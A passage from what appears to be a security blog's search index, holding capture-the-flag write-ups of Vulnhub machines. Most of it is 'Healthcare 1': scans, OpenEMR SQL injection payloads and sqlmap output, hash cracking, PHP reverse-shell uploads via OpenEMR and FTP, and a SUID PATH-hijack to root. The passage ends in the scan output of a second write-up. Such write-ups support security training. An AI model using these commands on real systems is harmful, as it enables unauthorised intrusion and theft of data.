Follow me at: http://v1n1v131r4.com d41d8cd98f00b204e9800998ecf8427e rootbash-4.3# " }, { "title": "Vulnhub - Healthcare 1", "url": "/posts/Healthcare-1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/web-app-cms-exploit, linux-priv-esc/suid/path-hijacking", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Wed Feb 2 03:04:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Healthcare/192.168.110.8/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Healthcare/192.168.110.8/scans/xml/_full_tcp_nmap.xml 192.168.110.8adjust_timeouts2: packet supposedly had rtt of -531134 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531134 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -176308 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -176308 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -760169 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -760169 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -760035 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -760035 microseconds. Ignoring time.Nmap scan report for 192.168.110.8Host is up, received arp-response (0.00053s latency).Scanned at 2022-02-02 03:04:27 +08 for 17sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.3d80/tcp open http syn-ack ttl 64 Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))| http-robots.txt: 8 disallowed entries | /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ |_/all_our_e-mail_addresses /admin/ /| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Coming Soon 2|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)MAC Address: 08:00:27:CA:51:55 (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: Didn&#39;t receive UDP response. Please try again with -sSUAggressive OS guesses: Linux 2.6.38 (99%), Linux 2.6.32 - 3.5 (98%), Linux 2.6.38 - 3.0 (96%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.32 - 3.10 (94%), Linux 2.6.37 (94%), Osmosys DMS DVR (93%), Linux 2.6.18 - 2.6.32 (93%), OpenWrt (Linux 2.4.32) (93%), Linux 2.6.22 (Fedora Core 6) (93%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=2/2%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61F9844C%P=x86_64-pc-linux-gnu)SEQ(SP=C3%GCD=1%ISR=C6%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW6%CC=N%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%TG=40%W=3890%S=O%A=S+%F=AS%O=M5B4ST11NW6%RD=0%Q=)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.002 days (since Wed Feb 2 03:01:45 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=197 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: UnixTRACEROUTEHOP RTT ADDRESS1 0.53 ms 192.168.110.8Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Feb 2 03:04:44 2022 -- 1 IP address (1 host up) scanned in 18.18 secondsTCP/21 (FTP) Anonymous access deniedTCP/80 (HTTP)Ferox┌──(root💀kali)-[~/vulnHub/Healthcare]└─# feroxbuster -u http://$ip -n -w /usr/share/wordlists/dirbuster/directory-list-2.3-compiled.txt -t 50 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.4.1───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.110.8 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-compiled.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.4.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🚫 Do Not Recurse │ true 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 121l 281w 5031c http://192.168.110.8/301 9l 29w 339c http://192.168.110.8/css200 2l 14w 1406c http://192.168.110.8/favicon301 9l 29w 341c http://192.168.110.8/fonts301 9l 29w 342c http://192.168.110.8/gitweb301 9l 29w 342c http://192.168.110.8/images403 42l 97w 0c http://192.168.110.8/images/200 121l 281w 5031c http://192.168.110.8/index301 9l 29w 338c http://192.168.110.8/js301 9l 29w 343c http://192.168.110.8/openemr403 1l 4w 59c http://192.168.110.8/phpMyAdmin200 19l 78w 620c http://192.168.110.8/robots403 42l 96w 0c http://192.168.110.8/server-info403 42l 96w 0c http://192.168.110.8/server-status301 9l 29w 342c http://192.168.110.8/vendor[####################] - 11m 1489922/1489922 0s found:15 errors:0 [####################] - 11m 1489922/1489922 2120/s http://192.168.110.8 openemr phpMyAdmin robotsNikto┌──(root💀kali)-[~/vulnHub/Healthcare]└─# nikto -ask=no -h http://192.168.110.8:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Healthcare/192.168.110.8/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.8+ Target Hostname: 192.168.110.8+ Target Port: 80+ Start Time: 2022-02-02 03:11:31 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan 6 14:21:38 2018+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ &quot;robots.txt&quot; contains 8 entries which should be manually viewed.+ Uncommon header &#39;tcn&#39; found, with contents: list+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...+ OSVDB-3233: /icons/README: Apache default file found.er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host+ End Time: 2022-02-02 04:01:06 (GMT8) (2975 seconds)---------------------------------------------------------------------------+ 1 host(s) tested /cgi-bin/test.cgi ‘shellshock’ vulnerability a false positive Initial FootholdTCP/80 (HTTP) - OpenEMR SQLi View enumerated directories openemr openEMR v4.1.0 phpMyAdmin robots ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/scans] └─# curl http://192.168.110.8/robots.txt -s | grep &quot;Disallow: /&quot; | cut -d &quot;/&quot; -f2 | tee robots_dir.txt manual manual-2.2 addon-modules doc images all_our_e-mail_addresses admin ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/scans] └─# for x in $(&amp;lt;robots_dir.txt); do echo http://$ip/${x}; done http://192.168.110.8/manual http://192.168.110.8/manual-2.2 http://192.168.110.8/addon-modules http://192.168.110.8/doc http://192.168.110.8/images http://192.168.110.8/all_our_e-mail_addresses http://192.168.110.8/admin addon-modules This directory can only be viewed from localhost images Access Denied Others Not found Search exploits for openEMR v4.1.0 Exploit Title Path OpenEMR 4.1.0 - ‘u’ SQL Injection php/webapps/49742.py Openemr-4.1.0 - SQL Injection php/webapps/17998.txt Try php/webapps/49742.py Edit url variable Run exploit ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit] └─# python3 49742.py ____ ________ _______ __ __ ___ ____ / __ \\____ ___ ____ / ____/ |/ / __ \\ / // / &amp;lt; // __ \\ / / / / __ \\/ _ \\/ __ \\/ __/ / /|_/ / /_/ / / // /_ / // / / / / /_/ / /_/ / __/ / / / /___/ / / / _, _/ /__ __/ / // /_/ / \\____/ .___/\\___/_/ /_/_____/_/ /_/_/ |_| /_/ (_)_(_)____/ /_/ ____ ___ __ _____ ____ __ _ / __ )/ (_)___ ____/ / / ___// __ \\ / / (_) / /_/ / / / __ \\/ __ / \\__ \\/ / / / / / / / / /_/ / / / / / / /_/ / ___/ / /_/ / / /___/ / /_____/_/_/_/ /_/\\__,_/ /____/\\___\\_\\/_____/_/ exploit by @ikuamike [+] Finding number of users... [+] Found number of users: 2 [+] Extracting username and password hash... admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8 medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d Alternative exploit, SQLMap ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit] └─# sqlmap -r sqli.txt -p &#39;u&#39; -D openemr -T users -C username,password --dump --output-dir=$(pwd)/sqlmap Parameter: u (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment) Payload: u=test&#39; OR NOT 9146=9146# Type: error-based Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: u=test&#39; AND (SELECT 5508 FROM(SELECT COUNT(*),CONCAT(0x7176626271,(SELECT (ELT(5508=5508,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OUIQ Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: u=test&#39; AND (SELECT 1257 FROM (SELECT(SLEEP(5)))UvXP)-- cwnE Database: openemr Table: users [2 entries] +----------+------------------------------------------+ | username | password | +----------+------------------------------------------+ | admin | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 | | medical | ab24aed5a7c4ad45615cd7e0da816eea39e4895d | +----------+------------------------------------------+ [15:01:52] [INFO] table &#39;openemr.users&#39; dumped to CSV file &#39;/root/vulnHub/Healthcare/192.168.110.8/exploit/sqlmap/192.168.110.8/dump/openemr/users.csv&#39; [15:01:52] [INFO] fetched data logged to text files under &#39;/root/vulnHub/Healthcare/192.168.110.8/exploit/sqlmap/192.168.110.8&#39; [*] ending @ 15:01:52 /2022-02-02/ Crack hash ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit] └─# hashcat -a 0 -m 100 hashes /usr/share/wordlists/rockyou.txt --show 3863efef9ee2bfbc51ecdca359c6302bed1389e8:ackbar ab24aed5a7c4ad45615cd7e0da816eea39e4895d:medical Login w/ admin:ackbarTCP/80 - OpenEMR RCE Since we do not have TCP/22 up, it is very likely we gain initial foothold via RCE Search RCE exploits for OpenEMR v4.1.0 Exploit Title Path OpenEMR 5.0.1 - Remote Code Execution (1) php/webapps/48515.py OpenEMR-RCE &amp;lt;= 5.0.1 https://github.com/noraj/OpenEMR-RCE All failed, probably because openemr/portal/import_template.php does not exist Upload reverse shell manually Proceed to Administration -&amp;gt; Others Insert php-reverse-shell.php Execute php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp/192.168.110.8/Downloads] └─# curl 192.168.110.8/openemr/sites/default/images/php-reverse-shell.php -s Apache shell obtained Initial Foothold 2TCP/21 (FTP) - Upload Reverse Shell Instead of inserting reverse shell @ OpenEMR, we upload a reverse shell through FTP Able to access FTP w/ medical:medical ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp] └─# ftp -nv $ip Connected to 192.168.110.8. 220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.110.8] ftp&amp;gt; user medical 331 Password required for medical Password: 230 User medical logged in Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; put test local: test remote: test 200 PORT command successful 150 Opening BINARY mode data connection for test 226 Transfer complete ftp&amp;gt; We have write access Download all files from medical ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp] └─# wget -m --no-passive ftp://medical:medical@$ip #Download all View directory structure ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp] └─# tree 192.168.110.8/ 192.168.110.8/ ├── Desktop │   ├── addlocale.desktop │   ├── drakfirewall.desktop │   ├── draknetcenter.desktop │   └── Get Libre Office.desktop ├── Documents │   ├── OpenEMR Passwords.pdf │   └── Passwords.txt ├── Downloads │   └── openemr-4.1.0.tar.gz ├── Movies ├── Music ├── Pictures │   └── pclosmedical.png ├── Templates ├── tmp │   ├── debug.log │   ├── keyring-fPbG5t │   ├── keyring-hSBjUb │   ├── orbit-medical │   │   ├── bonobo-activation-register-b415b005c8435facdf68405e0000002c.lock │   │   ├── bonobo-activation-register-d37436b21aa5f1f34a448a3a00000028.lock │   │   ├── bonobo-activation-server-b415b005c8435facdf68405e0000002c-ior │   │   └── bonobo-activation-server-d37436b21aa5f1f34a448a3a00000028-ior │   ├── orbit-root │   ├── pulse-8LagrogWihJO │   │   └── pid │   ├── ssh-RoIgQkNbu874 │   └── ssh-XLjWYherh886 └── Videos 16 directories, 14 files OpenEMR Passwords.pdf Passwords.txt We can tell this a user’s home directory We can add our id_rsa.pub key to his authorized_keys to be able to SSH into it, but TCP/22 is not up. View interesting files Passwords.txt ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp] └─# cat 192.168.110.8/Documents/Passwords.txt PCLINUXOS MEDICAL root-root medical-medical OPENEMR admin-admin medical-medical OpenEMR Passwords.pdf Contains some default credentials, not useful Head back to FTP, found out that the entire filesystem / is shared in FTP Path to /var/www/html/openemr, insert php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit/openemr_rce] └─# ftp -nv $ip Connected to 192.168.110.8. 220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.110.8] ftp&amp;gt; user medical 331 Password required for medical Password: 230 User medical logged in Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; cd /var/www/html/openemr 250 CWD command successful ftp&amp;gt; put php-reverse-shell.php local: php-reverse-shell.php remote: php-reverse-shell.php 200 PORT command successful 150 Opening BINARY mode data connection for php-reverse-shell.php 226 Transfer complete 5495 bytes sent in 0.00 secs (30.2916 MB/s) Execute reverse shell ┌──(root💀kali)-[~/vulnHub/Healthcare] └─# curl 192.168.110.8/openemr/php-reverse-shell.php Privilege EscalationMedical - Via Creds Found Earlier we found medical creds Switch to medical w/ medical:medical User Flag sh-4.1$ cat user.txt cat user.txt d41d8cd98f00b204e9800998ecf8427e sh-4.1$ Root - Via SUID Binary (Path Hijacking) Check for SUID Binaries [medical@localhost ~]$ find / -perm -4000 2&amp;gt;/dev/null ... /usr/bin/expiry /usr/bin/newgrp /usr/bin/pkexec /usr/bin/wvdial /usr/bin/pmount /usr/bin/sperl5.10.1 /usr/bin/gpgsm /usr/bin/gpasswd /usr/bin/chfn /usr/bin/su /usr/bin/passwd /usr/bin/gpg /usr/bin/healthcheck &amp;lt;- Suspicious ... View contents of healthcheck [medical@localhost ~]$ strings /usr/bin/healthcheck /lib/ld-linux.so.2 __gmon_start__ libc.so.6 _IO_stdin_used setuid system setgid __libc_start_main GLIBC_2.0 PTRhp [^_] clear ; echo &#39;System Health Check&#39; ; echo &#39;&#39; ; echo &#39;Scanning System&#39; ; sleep 2 ; ifconfig ; fdisk -l ; du -h ifconfig is called w/o specifying its full path fdisk is called w/o specifying its full path du is called w/o specifying its full path Exploit Prepend /tmp to our PATH environment variable [medical@localhost tmp]$ export PATH=/tmp:$PATH [medical@localhost ~]$ echo $PATH /tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin Create binary to spawn a root shell [medical@localhost tmp]$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /tmp/ifconfig; chmod 4777 /tmp/ifconfig; Check if /tmp/ifconfig will be called first [medical@localhost ~]$ which ifconfig /tmp/ifconfig Run healthcheck [medical@localhost ~]$ /usr/bin/healthcheck View /tmp [medical@localhost ~]$ ls -la /tmp total 5588 -rwsrwxrwx 1 medical medical 67 Feb 1 15:24 ifconfig* -rw------- 1 root root 0 Jul 29 2020 init.vQ5ZLd -rw-r--r-- 1 medical medical 193518 Feb 1 15:13 linpeas.out -rwxr-xr-x 1 medical medical 762836 Feb 1 15:11 linpeas.sh* -rw-r--r-- 1 medical medical 16328 Feb 2 2022 raptor_udf2.so -rwsr-xr-x 1 root root 864208 Feb 1 15:24 rootbash* &amp;lt;- Rootbash generated -rw-r--r-- 1 apache apache 3841560 Jul 29 2020 setup_dump.sql Obtain root shell [medical@localhost ~]$ /tmp/rootbash -p Root Flag rootbash-4.1# cat root.txt ██  ██  ██████  ██  ██  ████████ ██████  ██ ███████ ██████  ██  ██  █████  ██████  ██████  ███████ ██████  ██  ██  ██  ██    ██ ██  ██     ██    ██   ██ ██ ██      ██   ██  ██  ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██  ████   ██  ██ ██  ██  ██  ██████  ██ █████  ██  ██  ███████ ███████ ██████  ██  ██ █████  ██████  ██  ██   ██  ██ ██  ██  ██  ██   ██ ██ ██     ██  ██  ██   ██ ██   ██ ██   ██ ██  ██ ██     ██   ██     ██   ██████   ██████   ██  ██  ██ ██ ███████ ██████   ██  ██ ██  ██ ██  ██ ██████  ███████ ██  ██ ██  Thanks for Playing! Follow me at: http://v1n1v131r4.com root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b " }, { "title": "Vulnhub - Hack Me Please 1", "url": "/posts/Hack-Me-Please-1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/web-app-cms-exploit, linux-priv-esc/sudo/misconfig", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Mon Jan 31 23:55:15 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/HackMePlease/192.168.110.7/scans/_full_tcp_nmap.txt -oX /root/vulnHub/HackMePlease/192.168.110.7/scans/xml/_full_tcp_nmap.xml 192.168.110.7adjust_timeouts2: packet supposedly had rtt of -454979 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -454979 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -835237 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -835237 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -834959 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -834959 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -529753 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -529753 microseconds. Ignoring time.Nmap scan report for 192.168.110.7Host is up, received arp-response (0.00089s latency).Scanned at 2022-01-31 23:55:29 +08 for 62sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-title: Welcome to the land of pwnland|_http-server-header: Apache/2.4.41 (Ubuntu)3306/tcp open mysql syn-ack ttl 64 MySQL 8.0.25-0ubuntu0.20.04.1| mysql-info: | Protocol: 10| Version: 8.0.25-0ubuntu0.20.04.1| Thread ID: 1704| Capabilities flags: 65535| Some Capabilities: IgnoreSigpipes, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, ODBCClient, Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, SupportsCompression, FoundRows, SwitchToSSLAfterHandshake, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults| Status: Autocommit| Salt: b\\x15tuL%Q~\\x19h\\x11v\\x11:%&amp;lt;&amp;gt;=e |_ Auth Plugin Name: caching_sha2_password| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate| Issuer: commonName=MySQL_Server_8.0.25_Auto_Generated_CA_Certificate| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-07-03T00:33:15| Not valid after: 2031-07-01T00:33:15| MD5: 98c4 4d26 28a0 4b1c c28e a11d 9b9c 659f| SHA-1: b293 2106 73a7 114a 3713 3690 a920 e683 27b5 1f83| -----BEGIN CERTIFICATE-----| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR| TF9TZXJ2ZXJfOC4wLjI1X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X| DTIxMDcwMzAwMzMxNVoXDTMxMDcwMTAwMzMxNVowQDE+MDwGA1UEAww1TXlTUUxf| U2VydmVyXzguMC4yNV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCbdAreXsu85u+BsHpJfTRX| uwIyfy3kD3NM361aBp+C5Gq13qoWWTI795YzwBf4egDV/SsI9LNu8mX4FPoBDK1+| i/RqDQk11j/TAFwEMzbyT0uu3KSpwwv84L5WUAJP2UxMY47LIrZCGawkSGN8EP95| zh5xt6qsKdg/WjCSxmr1cEfpBxk9VaGrvenvEqXkM1010ZXC/rrmG/IpC0o+6cX4| EP9f2PzqZNsvQqI0BzzGJYjq66G/I0zRGk96AzZqzAtehF/euywvmQusUONZEE0k| q59C+n97+SFXh+goEWnoQfwsfzPFL6vb8rnKEDcQHUN3Wi0HbC2Wig5AM/wolknD| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACKt6We+| Hf7qLuEFhhG6nCWakVjuR0iwkrRzHvknKeiTnsCoX0A3ixUjIUoYMnANT9zLz48a| /4SDFxgLm9BevRyhhgZrjKmXRljYx/3yNo+T0U1zMh3YW8wzRdDMz/j73hTx6Wk6| mlCHqsrydgejTrtSMf3jnhFgf/R6WVSW5Pnq6B2kantqb1renHTmUrR8H+e82JGm| oiwmQmNZs2e/07WHDsr5lpeVTfxwh2bvvmmPTuBsEtobKDhc7WVtN3rjs9VxNcgT| OFr2CnMSdQ5BS8MjFX+j8q4e5Ul2fej+zMadimsVdO2QW8/LF/o1BuFC5P+2HSrn| XNiJghm6MXoCgsI=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time33060/tcp open socks5 syn-ack ttl 64| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: | Invalid message&quot;| HY000| LDAPBindReq: | *Parse error unserializing protobuf message&quot;| HY000| Radmin: | authentication.mechanisms| MYSQL41| SHA256_MEMORY| doc.formats| text| client.interactive| compression| algorithm| deflate_stream| lz4_message| zstd_stream| node_type| mysql| client.pwd_expire_ok| SSLv23SessionReq: | Invalid message-frame.&quot;|_ HY000| socks-auth-info: | No authentication| No authentication|_ No authentication1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port33060-TCP:V=7.92%I=9%D=1/31%Time=61F8067B%P=x86_64-pc-linux-gnu%r(NSF:ULL,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(GenericLines,9,&quot;\\x05\\0\\0\\0\\x0b\\SF:x08\\x05\\x1a\\0&quot;)%r(GetRequest,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(HTTPOpSF:tions,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(RTSPRequest,9,&quot;\\x05\\0\\0\\0\\x0bSF:\\x08\\x05\\x1a\\0&quot;)%r(RPCCheck,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(DNSVersSF:ionBindReqTCP,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(DNSStatusRequestTCP,2SF:B,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\x0fISF:nvalid\\x20message\\&quot;\\x05HY000&quot;)%r(Hello,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;SF:)%r(Help,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(SSLSessionReq,2B,&quot;\\x05\\0\\0SF:\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\x0fInvalid\\x20mSF:essage\\&quot;\\x05HY000&quot;)%r(TerminalServerCookie,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1SF:a\\0&quot;)%r(TLSSessionReq,2B,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x0SF:8\\x01\\x10\\x88&#39;\\x1a\\x0fInvalid\\x20message\\&quot;\\x05HY000&quot;)%r(SSLv23SessionReSF:q,32,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0%\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\x16ISF:nvalid\\x20message-frame\\.\\&quot;\\x05HY000&quot;)%r(Kerberos,9,&quot;\\x05\\0\\0\\0\\x0b\\x08SF:\\x05\\x1a\\0&quot;)%r(SMBProgNeg,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(X11Probe,SF:2B,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\x0fSF:Invalid\\x20message\\&quot;\\x05HY000&quot;)%r(FourOhFourRequest,9,&quot;\\x05\\0\\0\\0\\x0b\\xSF:08\\x05\\x1a\\0&quot;)%r(LPDString,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(LDAPSearSF:chReq,2B,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\xSF:1a\\x0fInvalid\\x20message\\&quot;\\x05HY000&quot;)%r(LDAPBindReq,46,&quot;\\x05\\0\\0\\0\\x0b\\SF:x08\\x05\\x1a\\x009\\0\\0\\0\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\*Parse\\x20error\\x20unseSF:rializing\\x20protobuf\\x20message\\&quot;\\x05HY000&quot;)%r(SIPOptions,9,&quot;\\x05\\0\\0\\SF:0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(LANDesk-RC,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(SF:TerminalServer,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(NCP,9,&quot;\\x05\\0\\0\\0\\x0SF:b\\x08\\x05\\x1a\\0&quot;)%r(NotesRPC,2B,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0SF:\\x01\\x08\\x01\\x10\\x88&#39;\\x1a\\x0fInvalid\\x20message\\&quot;\\x05HY000&quot;)%r(DistCCD,SF:9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;)%r(JavaRMI,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\xSF:1a\\0&quot;)%r(Radmin,15D,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0P\\x01\\0\\0\\x02\\n\\x0f\\n\\SF:x03tls\\x12\\x08\\x08\\x01\\x12\\x04\\x08\\x07@\\0\\nM\\n\\x19authentication\\.mechaSF:nism